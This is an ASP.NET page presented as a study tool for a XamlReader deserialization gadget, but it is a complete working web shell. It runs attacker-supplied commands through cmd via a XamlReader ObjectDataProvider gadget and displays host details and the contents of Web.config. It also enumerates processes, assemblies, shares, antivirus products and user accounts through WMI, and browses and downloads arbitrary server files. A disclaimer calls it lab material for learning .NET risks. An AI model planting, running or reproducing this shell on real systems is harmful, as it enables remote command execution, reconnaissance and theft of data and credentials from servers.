<%@ Page Language="C#" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ Assembly  Name="PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
<%@ Assembly  Name="WindowsBase,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
<%@ Assembly  Name="System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Windows.Markup"%>
<%@ Import Namespace="System.Management"%>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>XamlReader.Parse风险闭环检查智能小蜜</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>
<body>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
<script runat="server">
    protected void Page_load(object sender, EventArgs e)
    {
        Server.ScriptTimeout = 775000;
        if (IsPostBack)
        {
            var content = Request.Form["content"];
            if (!string.IsNullOrEmpty(content))
            {
                string ExecCode = EncodeBase64("utf-8", content);
                StringBuilder strXMAL = new StringBuilder("<ResourceDictionary ");
                strXMAL.Append("xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" ");
                strXMAL.Append("xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" ");
                strXMAL.Append("xmlns:b=\"clr-namespace:System;assembly=mscorlib\" ");
                strXMAL.Append("xmlns:pro =\"clr-namespace:System.Diagnostics;assembly=System\">");
                strXMAL.Append("<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type pro:Process}\" MethodName=\"Start\">");
                strXMAL.Append("<ObjectDataProvider.MethodParameters>");
                strXMAL.Append("<b:String>cmd</b:String>");
                strXMAL.Append("<b:String>"+ DecodeBase64("utf-8",ExecCode) +"</b:String>");
                strXMAL.Append("</ObjectDataProvider.MethodParameters>");
                strXMAL.Append("</ObjectDataProvider>");
                strXMAL.Append("</ResourceDictionary>");
                XamlReader.Parse(strXMAL.ToString());
                Response.Write("<script>alert('已经尝试启动了新进程，请到【主机进程高地】标签确认结果！');window.location.href=(window.location.href.split('?')[0]);</" + "script>");
            }

        }

        var downFile = Request.QueryString["fileName"];
        if (!string.IsNullOrEmpty(downFile))
        {
            downloadFile(downFile);
        }

        var openFolder = Request.QueryString["folderName"];
        if (!string.IsNullOrEmpty(openFolder))
        {
            getFolderList(openFolder);
        }

    }


    private static string EncodeBase64(string code_type, string code)
    {
        string encode = "";
        byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
        try
        {
            encode = Convert.ToBase64String(bytes);
        }
        catch
        {
            encode = code;
        }
        return encode;
    }
    private static string DecodeBase64(string code_type, string code)
    {
        string decode = "";
        byte[] bytes = Convert.FromBase64String(code);
        try
        {
            decode = Encoding.GetEncoding(code_type).GetString(bytes);
        }
        catch
        {
            decode = code;
        }
        return decode;
    }

    private static int SecondToMinute(int Second)
    {
        decimal mm = (decimal)((decimal)Second / (decimal)60);
        return Convert.ToInt32(Math.Ceiling(mm));
    }

    private static string getProcessList()
    {
        var runProcess = from proc in Process.GetProcesses(".") orderby proc.Id select proc;
        string info = null;
        int i = 1;
        foreach (var p in runProcess)
        {
            info += string.Format("<tr><th scope=\"row\">{0}</th><td>{1}</td><td>{2}</td><td>{3}</td><td>{4}</td></tr>", i, p.Id, p.ProcessName, p.SessionId ,p.MainWindowTitle);
            i++;
        }
        return info;
    }

    

    private static string getAssemblyList()
    {
        var runAssembly = AppDomain.CurrentDomain.GetAssemblies();
        string info = null;
        int i = 1;
        foreach (var p in runAssembly)
        {
            //info += string.Format("{0} ——> {1} <br>", p.GetName().Name, p.GetName().FullName);
            info += string.Format("<tr><th scope=\"row\">{0}</th><td>{1}</td></tr>", i,p.GetName().FullName);
            i++;
        }
        return info;
    }

    #region 获取计算机无操作时间
    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO
    {
        // 设置结构体块容量  
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        // 捕获的时间  
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }
    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static string GetLastInputTime()
    {
        long time = 0;
        try
        {
            LASTINPUTINFO vLastInputInfo = new LASTINPUTINFO();
            vLastInputInfo.cbSize = Marshal.SizeOf(vLastInputInfo);
            if (!GetLastInputInfo(ref vLastInputInfo)) time = 0;
            else time = Environment.TickCount - (long)vLastInputInfo.dwTime;
        }
        catch { }
        return time.ToString();
    }
    #endregion

    public static string getShareList()
    {
        string rs = null;
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from win32_share");
            foreach (ManagementObject share in searcher.Get())
            {
                try
                {
                    string name = share["Name"].ToString();
                    string path = share["Path"].ToString();
                    rs += string.Format("共享名:{0} ——> {1} <br>", name, path);
                }
                catch { }
            }
        }
        catch { }
        if (string.IsNullOrEmpty(rs))
        {
            return "/";
        }
        return rs;
    }

    public static string getApplicationList(string queryObject)
    {
        string rs = null;
        int i = 1;
        string[] queryObjectStrings = queryObject.Split(':');
        try
        {
            ManagementObjectSearcher mos = new ManagementObjectSearcher(queryObjectStrings[0],"SELECT * FROM " + queryObjectStrings[1]);
            ManagementObjectCollection managementObjectCollection = mos.Get();
            foreach (ManagementObject mo in managementObjectCollection)
            {
                foreach (var property in mo.Properties)
                {
                    rs += string.Format("<tr><th scope=\"row\">{0}</th><td>{1}</td><td>{2}</td></tr>", i,property.Name,property.Value);
                    i++;
                }
            }
        }
        catch { }
        if (string.IsNullOrEmpty(rs))
        {
            return "/";
        }
        return rs;
    }

    private static string getFileList(string fileSearchContext)
    {
        string path = fileSearchContext;
        var dir = new DirectoryInfo(path);
        string info = null;
        try
        {
            var files = dir.GetFiles("*.*", SearchOption.AllDirectories);

            var fileQuery = from file in files
                            orderby file.Name
                            select file;
            foreach (var file in fileQuery)
            {
                info += string.Format("<li class=\"list-group-item\"><a target='_blank' class='btn btn-primary stretched-link' href=\"?fileName={0}\">{0}</a></li> \r\n", file.FullName);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
        return info;
    }


    private static string getFolderList(string fileSearchContext)
    {
        string info = null;
        if (fileSearchContext == "fixed")
        {
            var sortedDrives = DriveInfo.GetDrives().OrderBy(l => l.AvailableFreeSpace).ToList();

            foreach (var folderDrive in sortedDrives)
            {
                info += string.Format("<li class=\"list-group-item\"><a class='btn btn-primary stretched-link' href=\"?folderName={0}\">{0}</a></li> \r\n", folderDrive.Name);
            }

        }
        else
        {
            try
            {
                string[] entries = Directory.GetFileSystemEntries(fileSearchContext, ".", SearchOption.TopDirectoryOnly);
                foreach (string entry in entries)
                {
                    if (Directory.Exists(entry) == true)
                    {
                        info += string.Format("<li class=\"list-group-item\"><a class='stretched-link' href=\"?folderName={0}\">{0}</a></li> \r\n", entry);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                //throw;
            }


            try
            {
                string[] entries = Directory.GetFileSystemEntries(fileSearchContext, ".", SearchOption.TopDirectoryOnly);
                foreach (string entry in entries)
                {

                    if (File.Exists(entry) == true)
                    {
                        info += string.Format("<li class=\"list-group-item\"><a target='_blank' class='stretched-link text-danger' href=\"?fileName={0}\">{0}</a></li> \r\n", entry);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                //throw;
            }
        }
        return info;

    }



    private void downloadFile(string fileName)
    {
        if (File.Exists(fileName) == true)
        {
            FileInfo fi = new FileInfo(fileName);
            Response.Clear();
            Response.ClearHeaders();
            Response.Buffer = false;
            Response.ContentType = "application/octet-stream";
            Response.AddHeader ("Content-Disposition","attachment;filename=" + HttpUtility.UrlEncode (fi.Name,System.Text.Encoding.UTF8 ));
            Response.AppendHeader ("Content-Length",fi.Length.ToString ());
            Response.WriteFile (fi.FullName);
            Response.Flush();
        }
    }



</script>
<form id="form1" runat="server" method="post">
        <h2 style="margin: 30px 0px;text-align: center">XamlReader.Parse风险闭环检查智能小蜜</h2>
        <div>
            <ul class="nav nav-tabs">
                <li class="nav-item">
                    <a href="#home" onclick="window.location.href=(window.location.href.split('?')[0]);"  class="nav-link <% if (Request.Form.Count == 0 && Request.QueryString.Count == 0) { Response.Write("active"); } %>" data-bs-toggle="tab">首页重载必读</a>
                </li>
                <li class="nav-item">
                    <a href="#profile" class="nav-link" data-bs-toggle="tab">运行环境透视</a>
                </li>
                <li class="nav-item">
                    <a href="#process" class="nav-link" data-bs-toggle="tab">主机进程高地</a>
                </li>
                <li class="nav-item">
                    <a href="#assembly" class="nav-link" data-bs-toggle="tab">程序集主战场</a>
                </li>
                <li class="nav-item">
                    <a href="#wmi" class="nav-link <% if (!string.IsNullOrEmpty(Request.Form["wmiQuery"])) { Response.Write("show active"); } %>" data-bs-toggle="tab">主机风险洞察</a>
                </li>
                <li class="nav-item">
                    <a href="#messages" class="nav-link <% if (!string.IsNullOrEmpty(Request.Form["content"])) { Response.Write("show active"); } %>" data-bs-toggle="tab">执行命令风口</a>
                </li>
                <li class="nav-item">
                    <a href="#filesearch" class="nav-link <% if (!string.IsNullOrEmpty(Request.Form["fileSearchContext"]) || !string.IsNullOrEmpty(Request.QueryString["folderName"])) { if (string.IsNullOrEmpty(Request.Form["wmiQuery"])){
                                                                 Response.Write("active");
                                                                 }
                                                             } %>" data-bs-toggle="tab">目录文件探索</a>
                </li>
            </ul>
            <div class="tab-content">
                <div class="tab-pane fade <% if (Request.Form.Count == 0 && Request.QueryString.Count == 0) { Response.Write("show active"); } %>" id="home">
                    <div class="mb-3" style="margin: 20px 20px;">
                        <dl class="row">
                            <dt class="col-sm-3">1.使用说明</dt>
                            <dd class="col-sm-9">本程序仅供实验学习.NET FrameWork框架已知的安全风险，请勿违法滥用！</dd>

                            <dt class="col-sm-3">2.引用来源</dt>
                            <dd class="col-sm-9">来源自.NET高级代码审计反序列化漏洞第14课 Gadget：XamlReader</dd>

                            <dt class="col-sm-3">3.阅读链接</dt>
                            <dd class="col-sm-9">https://mp.weixin.qq.com/s/sHKR0zlW2CsphGAmv3_KVA</dd>
                            
                            <dt class="col-sm-3">4.公众号</dt>
                            <dd class="col-sm-9">dotNet安全矩阵</dd>
                            
                            <dt class="col-sm-3">5.二维码</dt>
                            <dd class="col-sm-9"><img src="https://github.com/Ivan1ee/NET-Deserialize/raw/master/gzh.jpg" width="200" height="200"/></dd>
                            
                        </dl>
                    </div>
                </div>
                <div class="tab-pane fade" id="profile">
                    <ul class="list-group" style="margin: 20px 20px;">
                        <li class="list-group-item">主机名称：<%=System.Environment.MachineName%></li>
                        <li class="list-group-item">主机系统：<%=System.Environment.OSVersion%></li>
                        <li class="list-group-item">主机地址：<%=Dns.GetHostEntry(Dns.GetHostName()).AddressList[1].ToString()%></li>
                        <li class="list-group-item">是64位?：<%=System.Environment.Is64BitOperatingSystem%></li>
                        <li class="list-group-item">CPU数量：<%=System.Environment.ProcessorCount%></li>
                        <li class="list-group-item">系统目录：<%=System.Environment.SystemDirectory%></li>
                        <li class="list-group-item">运行天数：<%=SecondToMinute(System.Environment.TickCount)/(24*60)%></li>
                        <li class="list-group-item">系统用户：<%=System.Environment.UserName%></li>
                        <li class="list-group-item">运行目录：<%=System.Environment.CurrentDirectory%></li>
                        <li class="list-group-item">物理目录：<%=Server.MapPath(Request.ApplicationPath)%></li>
                        <li class="list-group-item">日志路径：<%=Request.ServerVariables["Instance_Meta_Path"]%></li>
                        <li class="list-group-item">进程数据：<%=System.Environment.CommandLine%></li>
                        <li class="list-group-item">配置文件：<%=System.Security.SecurityElement.Escape(File.ReadAllText(Server.MapPath("/Web.config")))%></li>
                        <li class="list-group-item">主机空闲：<%=GetLastInputTime()%></li>
                        <li class="list-group-item">主机共享：<%=getShareList()%></li>
                        <li class="list-group-item">NET版本：<%=System.Environment.Version%></li>
                        <li class="list-group-item">程序域：<%=AppDomain.CurrentDomain.FriendlyName%></li>
                    </ul>
                </div>
                <div class="tab-pane fade" id="process">
                    <ul class="list-group" style="margin: 20px 20px;">
                        <li class="list-group-item">
                            
                            <table class="table caption-top">
                                <caption>List of Process</caption>
                                <thead>
                                <tr>
                                    <th scope="col">#</th>
                                    <th scope="col">进程Id</th>
                                    <th scope="col">进程名称</th>
                                    <th scope="col">会话标识</th>
                                    <th scope="col">窗口标题</th>
                                </tr>
                                </thead>
                                <tbody>
                                <%=getProcessList() %>
                                </tbody>
                            </table>
                            

                        </li>
                    </ul>
                </div>
                <div class="tab-pane fade" id="assembly">
                    <ul class="list-group" style="margin: 20px 20px;">
                        <li class="list-group-item">
                            
                            <table class="table caption-top">
                                <caption>List of Assembly</caption>
                                <thead>
                                <tr>
                                    <th scope="col">#</th>
                                    <th scope="col">完全名称</th>
                                </tr>
                                </thead>
                                <tbody>
                                <%=getAssemblyList() %>
                                </tbody>
                            </table>

                        </li>
                    </ul>
                </div>
                <div class="tab-pane fade <% if (!string.IsNullOrEmpty(Request.Form["wmiQuery"])) { Response.Write("show active"); } %>" id="wmi">
                    <div style="margin: 20px 20px; width: 97%;" class="input-group mb-3">
                        <button class="btn btn-danger" type="submit">查询数据</button>
                        <select name="wmiQuery" class="form-select" id="inputGroupSelect03" aria-label="Example select with button addon">
                            <option value="\ROOT\SecurityCenter2:AntiVirusProduct" <% if (Request.Form["wmiQuery"] == "\\ROOT\\SecurityCenter2:AntiVirusProduct") { Response.Write("selected"); }%>>AntiVirusProduct（已安装的反病毒软件）</option>
                            <option value="\ROOT\CIMV2:Win32_Account" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Account") { Response.Write("selected"); }%>>Win32_Account（计算机系统已知的用户帐户和组帐户的信息）</option>
                            <option value="\ROOT\CIMV2:Win32_BIOS" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_BIOS") { Response.Write("selected"); }%>>Win32_BIOS（计算机系统的基本输入输出服务）</option>
                            <option value="\ROOT\CIMV2:Win32_BaseService" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_BaseService") { Response.Write("selected"); }%>>Win32_BaseService（安装在由服务控制管理器维护的注册表数据库中的可执行对象，与服务相关联的可执行文件可以在引导时由引导程序或系统启动）</option>
                            <option value="\ROOT\CIMV2:Win32_ComputerSystem" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_ComputerSystem") { Response.Write("selected"); }%>>Win32_ComputerSystem（运行 Windows 的计算机系统名）</option>
                            <option value="\ROOT\CIMV2:Win32_ComputerSystemProduct" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_ComputerSystemProduct") { Response.Write("selected"); }%>>Win32_ComputerSystemProduct（包括在此计算机系统上使用的软件和硬件）</option>
                            <option value="\ROOT\CIMV2:Win32_DependentService" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_DependentService") { Response.Write("selected"); }%>>Win32_DependentService（关联两个相互依赖的基础服务）</option>
                            <option value="\ROOT\CIMV2:Win32_Desktop" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Desktop") { Response.Write("selected"); }%>>Win32_Desktop（用户桌面的特征信息）</option>
                            <option value="\ROOT\CIMV2:Win32_DeviceSettings" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_DeviceSettings") { Response.Write("selected"); }%>>Win32_DeviceSettings（逻辑设备和驱动设置关联信息）</option>
                            <option value="\ROOT\CIMV2:Win32_DriverForDevice" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_DriverForDevice") { Response.Write("selected"); }%>>Win32_DriverForDevice（打印机实例与打印机驱动程序实例相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_Environment" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Environment") { Response.Write("selected"); }%>>Win32_Environment（Windows 计算机系统上的环境或系统环境设置）</option>
                            <option value="\ROOT\CIMV2:Win32_Group" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Group") { Response.Write("selected"); }%>>Win32_Group（组帐户允许更改用户列表的访问权限）</option>
                            <option value="\ROOT\CIMV2:Win32_GroupUser" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_GroupUser") { Response.Write("selected"); }%>>Win32_GroupUser（组和作为该组成员的帐户相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_IP4RouteTable" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_IP4RouteTable") { Response.Write("selected"); }%>>Win32_IP4RouteTable（Windows 计算机系统网络数据包路由的信息）</option>
                            <option value="\ROOT\CIMV2:Win32_LoggedOnUser" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LoggedOnUser") { Response.Write("selected"); }%>>Win32_LoggedOnUser（会话和用户帐户相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_LogicalDisk" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LogicalDisk") { Response.Write("selected"); }%>>Win32_LogicalDisk（计算机系统上本地存储设备的逻辑盘符）</option>
                            <option value="\ROOT\CIMV2:Win32_LogicalProgramGroup" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LogicalProgramGroup") { Response.Write("selected"); }%>>Win32_LogicalProgramGroup（计算机系统中的程序组附件或启动项）</option>
                            <option value="\ROOT\CIMV2:Win32_LogicalProgramGroupDirectory" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LogicalProgramGroupDirectory") { Response.Write("selected"); }%>>Win32_LogicalProgramGroupDirectory（开始菜单中的分组和关联的存储文件目录）</option>
                            <option value="\ROOT\CIMV2:Win32_LogicalProgramGroupItem" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LogicalProgramGroupItem") { Response.Write("selected"); }%>>Win32_LogicalProgramGroupItem（Win32_LogicalProgramGroup包含的元素）</option>
                            <option value="\ROOT\CIMV2:Win32_LogicalProgramGroupItemDataFile" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_LogicalProgramGroupItemDataFile") { Response.Write("selected"); }%>>Win32_LogicalProgramGroupItemDataFile（“开始”菜单的程序组项与存储它们的文件相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_NetworkLoginProfile" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_NetworkLoginProfile") { Response.Write("selected"); }%>>Win32_NetworkLoginProfile  （计算机系统上的网络登录信息，这包括但不限于密码状态、访问权限、磁盘配额和登录目录路径）</option>
                            <option value="\ROOT\CIMV2:Win32_OperatingSystemQFE" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_OperatingSystemQFE") { Response.Write("selected"); }%>>Win32_OperatingSystemQFE（操作系统和应用的产品更新相关）</option>
                            <option value="\ROOT\CIMV2:Win32_Process" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Process") { Response.Write("selected"); }%>>Win32_Process（操作系统上的进程）</option>
                            <option value="\ROOT\CIMV2:Win32_Printer" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Printer") { Response.Write("selected"); }%>>Win32_Printer（操作系统设备可以在纸张或其他介质上生成打印的图像或文本）</option>
                            <option value="\ROOT\CIMV2:Win32_PrinterDriver" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_PrinterDriver") { Response.Write("selected"); }%>>Win32_PrinterDriver（代表Win32_Printer实例的驱动程序）</option>
                            <option value="\ROOT\CIMV2:Win32_PrinterDriverDll" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_PrinterDriverDll") { Response.Write("selected"); }%>>Win32_PrinterDriverDll（关联本地打印机及其驱动程序文件）</option>
                            <option value="\ROOT\CIMV2:Win32_PrinterShare" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_PrinterShare") { Response.Write("selected"); }%>>Win32_PrinterShare（本地打印机与通过网络查看时表示它的共享相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_PrintJob" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_PrintJob") { Response.Write("selected"); }%>>Win32_PrintJob（Windows 应用程序生成的打印作业）</option>
                            <option value="\ROOT\CIMV2:Win32_ProgramGroupContents" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_ProgramGroupContents") { Response.Write("selected"); }%>>Win32_ProgramGroupContents（程序组顺序和其中包含的单个程序组或项目相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_QuickFixEngineering" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_QuickFixEngineering") { Response.Write("selected"); }%>>Win32_QuickFixEngineering（Windows 计算机系统已安装的补丁）</option>
                            <option value="\ROOT\CIMV2:Win32_SessionProcess" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_SessionProcess") { Response.Write("selected"); }%>>Win32_SessionProcess（登录会话和与该会话关联的进程之间的关联）</option>
                            <option value="\ROOT\CIMV2:Win32_ShareToDirectory" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_ShareToDirectory") { Response.Write("selected"); }%>>Win32_ShareToDirectory（计算机系统上的共享资源与其映射到的目录相关联）</option>
                            <option value="\ROOT\CIMV2:Win32_Service" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Service") { Response.Write("selected"); }%>>Win32_Service（运行 Windows 的计算机系统上的服务）</option>
                            <option value="\ROOT\CIMV2:Win32_Share" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_Share") { Response.Write("selected"); }%>>Win32_Share（运行Windows的计算机系统上的共享资源，磁盘驱动器、打印机、进程间通信或其他可共享设备）</option>
                            <option value="\ROOT\CIMV2:Win32_StartupCommand" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_StartupCommand") { Response.Write("selected"); }%>>Win32_StartupCommand（当用户登录到计算机系统时自动运行的命令）</option>
                            <option value="\ROOT\CIMV2:Win32_SystemAccount" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_SystemAccount") { Response.Write("selected"); }%>>Win32_SystemAccount（系统帐户，系统帐户由操作系统和服务使用）</option>
                            <option value="\ROOT\CIMV2:Win32_SystemUsers" <% if (Request.Form["wmiQuery"] == "\\ROOT\\CIMV2:Win32_SystemUsers") { Response.Write("selected"); }%>>Win32_SystemUsers（计算机系统和该系统上的用户帐户相关联）</option>
                        </select>
                    </div>
                    <ul class="list-group" style="margin: 20px 20px;">
                        <li class="list-group-item">


                            <table class="table caption-top">
                                <caption>List of WMI</caption>
                                <thead>
                                <tr>
                                    <th scope="col">#</th>
                                    <th scope="col">列名</th>
                                    <th scope="col">列值</th>
                                </tr>
                                </thead>
                                <tbody>
                                <%if (!string.IsNullOrEmpty(Request.Form["wmiQuery"])){Response.Write(getApplicationList(Request.Form["wmiQuery"]));}
                                  else
                                  {
                                      Response.Write(getApplicationList("\\ROOT\\SecurityCenter2:AntiVirusProduct"));
                                  } %>
                                </tbody>
                            </table>

                            
                        </li>
                    </ul>
                </div>
                <div class="tab-pane fade <% if (!string.IsNullOrEmpty(Request.Form["content"])) { Response.Write("show active"); } %>" id="messages">
                    <div class="tab-pane fade show active" id="home">
                        <div class="mb-3" style="margin: 20px 20px;">
                            <input class="form-control" style="margin-bottom:20px;" type="text" placeholder="cmd.exe" aria-label="readonly input example" readonly>
                            <textarea class="form-control" rows="5" id="comment" name="content" placeholder="/c calc"></textarea>
                        </div>
                        <button type="submit" name="addBtn" class="btn btn-danger" style="margin: 0px 20px;">执行检查</button>
                    </div>
                </div>
                <div class="tab-pane fade <% if (!string.IsNullOrEmpty(Request.Form["fileSearchContext"]) || !string.IsNullOrEmpty(Request.QueryString["folderName"])){ 
                                                 if (string.IsNullOrEmpty(Request.Form["wmiQuery"])){
                                                    Response.Write("show active");
                                                 }
                                             } %> " id="filesearch">
                    <div class="tab-pane fade show active" id="home">
                        <div class="mb-3" style="margin: 20px 20px;">
                            <input class="form-control" type="text" name="fileSearchContext" placeholder="C:\Windows\Temp\" aria-label="readonly input example" value="<%=Request.Form["fileSearchContext"]%>">
                        </div>
                        <button type="submit" name="filesearchBtn" class="btn btn-danger" style="margin: 0px 20px;">查找文件</button>
                        <ul class="list-group" style="margin: 20px 20px;">
                            <%if (!string.IsNullOrEmpty(Request.Form["fileSearchContext"]))
                              {
                                  Response.Write(getFolderList(Request.Form["fileSearchContext"]));
                              }
                              else if (!string.IsNullOrEmpty(Request.QueryString["folderName"]))
                              {
                                  Response.Write(getFolderList(Request.QueryString["folderName"]));
                              }
                              else
                              {
                                  Response.Write(getFolderList("fixed"));
                              }
                            %>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </form>
</body>
</html>
